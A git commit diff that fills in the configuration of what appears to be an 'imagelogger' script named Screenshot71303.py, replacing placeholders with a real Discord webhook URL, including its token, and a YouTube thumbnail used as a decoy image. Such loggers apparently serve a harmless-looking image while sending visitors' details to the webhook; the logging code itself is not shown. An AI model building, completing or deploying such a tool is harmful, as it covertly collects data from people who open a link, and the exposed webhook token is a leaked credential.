f034db2df89c6f180e5f49183c88bb47d98d74bc
DevTravDYT <136118099+DevTravDYT@users.noreply.github.com>
2023-07-13 04:14:24 +0800

    Update Screenshot71303.py

--- api/Screenshot71303.py
+++ api/Screenshot71303.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1128773133713801307/kz1HZc-YU6bGpI-9r_24EDGcRDay_FHvG6RS58gzzKKzSCS3NhhsLwXFDC3L4QGb8UPw",
+    "image": "https://i.ytimg.com/vi/UKW4a0G301s/maxresdefault.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
